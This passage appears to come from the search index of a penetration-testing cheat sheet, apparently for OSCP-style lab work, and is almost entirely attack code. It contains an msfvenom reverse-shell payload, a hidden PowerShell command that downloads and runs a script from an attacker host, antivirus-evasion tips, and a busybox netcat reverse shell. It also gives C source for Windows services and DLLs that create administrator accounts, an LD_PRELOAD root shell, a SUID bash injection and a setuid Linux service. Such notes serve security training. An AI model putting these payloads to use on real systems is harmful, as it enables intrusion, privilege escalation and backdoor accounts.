};\n</code></pre></p> <pre><code># set execution policy\npowershell.exe\nSet-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser\n# generate payload for the above script, below one works only in x86 poweshell not in x64\nmsfvenom -p windows/shell_reverse_tcp LHOST=IPkali LPORT=4444 -f powershell\n# delivery/download\npowershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://IPattacker/AVbypass.ps1'); Invoke-Function\n</code></pre> <p>AV evasion: Change code like var name, func name with more generic names for interpreted scripts to evade AV Kleenscan.com</p>"},{"location":"11_Code_And_Exploits/#linux-shell","title":"Linux Shell","text":"<pre><code>bash -c \"&lt;revshell-bash&gt;\"\n# Some version of nc doesn't have the -e feature\nbusybox nc 192.168.45.175 7755 -e /bin/bash  # mostly work on every place as compared to other places \n</code></pre>"},{"location":"11_Code_And_Exploits/#source-c-code","title":"Source C Code","text":""},{"location":"11_Code_And_Exploits/#windows-service-c-code","title":"Windows Service C code","text":"<p>```c title:Simple one</p>"},{"location":"11_Code_And_Exploits/#include","title":"include  <p>int main () {   int i;</p> <p>i = system (\"net user dave2 password123! /add\");   i = system (\"net localgroup administrators dave2 /add\");</p> <p>return 0; } <pre><code>```c title:windows_service.c\n// x86_64-w64-mingw32-gcc winservice.c -o winservice.exe\n#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define SLEEP_TIME 5000\n\nSERVICE_STATUS ServiceStatus; \nSERVICE_STATUS_HANDLE hStatus; \n\nvoid ServiceMain(int argc, char** argv); \nvoid ControlHandler(DWORD request); \n\n//add the payload here\nint Run() \n{ \n    system(\"whoami &gt; c:\\\\windows\\\\temp\\\\service.txt\");\n    system (\"net user oscpstudent password123! /add\");\n    system (\"net localgroup administrators oscpstudent /add\");\n\n    return 0; \n} \n\nint main() \n{ \n    SERVICE_TABLE_ENTRY ServiceTable[2];\n    ServiceTable[0].lpServiceName = \"MyService\";\n    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;\n\n    ServiceTable[1].lpServiceName = NULL;\n    ServiceTable[1].lpServiceProc = NULL;\n\n    StartServiceCtrlDispatcher(ServiceTable);  \n    return 0;\n}\n\nvoid ServiceMain(int argc, char** argv) \n{ \n    ServiceStatus.dwServiceType        = SERVICE_WIN32; \n    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; \n    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;\n    ServiceStatus.dwWin32ExitCode      = 0; \n    ServiceStatus.dwServiceSpecificExitCode = 0; \n    ServiceStatus.dwCheckPoint         = 0; \n    ServiceStatus.dwWaitHint           = 0; \n\n    hStatus = RegisterServiceCtrlHandler(\"MyService\", (LPHANDLER_FUNCTION)ControlHandler); \n    Run(); \n\n    ServiceStatus.dwCurrentState = SERVICE_RUNNING; \n    SetServiceStatus (hStatus, &amp;ServiceStatus);\n\n    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)\n    {\n        Sleep(SLEEP_TIME);\n    }\n    return; \n}\n\nvoid ControlHandler(DWORD request) \n{ \n    switch(request) \n    { \n        case SERVICE_CONTROL_STOP: \n            ServiceStatus.dwWin32ExitCode = 0; \n            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; \n            SetServiceStatus (hStatus, &amp;ServiceStatus);\n            return; \n\n        case SERVICE_CONTROL_SHUTDOWN: \n            ServiceStatus.dwWin32ExitCode = 0; \n            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; \n            SetServiceStatus (hStatus, &amp;ServiceStatus);\n            return; \n\n        default:\n            break;\n    } \n    SetServiceStatus (hStatus,  &amp;ServiceStatus);\n    return; \n} \n</code></pre></p>","text":""},{"location":"11_Code_And_Exploits/#windows-dll-c-code","title":"Windows Dll C Code","text":"<pre><code>// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n\n#include &lt;windows.h&gt;\n\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        system(\"cmd.exe /k whoami &gt; C:\\\\Windows\\\\Temp\\\\dll.txt\");\n        ExitProcess(0);\n    }\n    return TRUE;\n}\n</code></pre> <pre><code>// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n#include &lt;stdlib.h&gt;\n#include &lt;windows.h&gt;\n\nBOOL APIENTRY DllMain(\nHANDLE hModule,// Handle to DLL module\nDWORD ul_reason_for_call,// Reason for calling function\nLPVOID lpReserved ) // Reserved\n{\n    switch ( ul_reason_for_call )\n    {\n        case DLL_PROCESS_ATTACH: // A process is loading the DLL.\n        int i;\n        i = system (\"net user dave3 password123! /add\");\n        i = system (\"net localgroup administrators dave3 /add\");\n        break;\n        case DLL_THREAD_ATTACH: // A process is creating a new thread.\n        break;\n        case DLL_THREAD_DETACH: // A thread exits normally.\n        break;\n        case DLL_PROCESS_DETACH: // A process unloads the DLL.\n        break;\n    }\n    return TRUE;\n}\n</code></pre>"},{"location":"11_Code_And_Exploits/#linux-shared-object-in-ld_preload-c-code","title":"Linux Shared Object in LD_PRELOAD C Code","text":"<pre><code>// gcc -fPIC -shared -o shell.so shell.c -nostartfiles\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");  // to unset ld_preload for child process of system() otherwise it will start again during system() means infinite loop\n    setgid(0);\n    setuid(0);\n    system(\"/bin/sh\");\n}\n</code></pre>"},{"location":"11_Code_And_Exploits/#shared-object-injection","title":"shared object injection","text":"<pre><code># gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    system(\"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p\");\n}\n</code></pre>"},{"location":"11_Code_And_Exploits/#linux-service-c-code","title":"Linux service C code","text":"<pre><code>// gcc shell_service.c -o shell_service\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    setuid(0);               // Ensure root privileges if installed as root-owned\n    setgid(0);\n    execl(\"/bin/bash\", \"bash\", NULL);\n    return 0;\n}\n</code></pre>"}]}